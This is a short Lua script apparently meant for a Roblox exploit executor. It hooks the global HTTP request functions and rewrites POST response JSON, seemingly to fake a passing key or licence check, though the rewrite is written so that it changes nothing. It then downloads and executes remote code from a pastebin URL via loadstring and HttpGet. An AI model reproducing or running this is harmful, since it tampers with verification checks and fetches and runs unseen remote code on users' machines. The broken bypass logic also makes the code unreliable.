local original = request or http_request

local function request(options)
    local response = original(options)

    if options.Method == 'POST' then
        local success, decoded = pcall(
            game:GetService('HttpService').JSONDecode,
            game:GetService('HttpService'),
            response.Body
        )

        if decoded.valid then
            decoded.valid = true
        end

        response.Body = game:GetService("HttpService"):JSONEncode(decoded)
    end

    return response
end

getgenv().request = request
getgenv().http_request = request

loadstring(game:HttpGet("https://pastebin.com/raw/wk11PpEw"))()
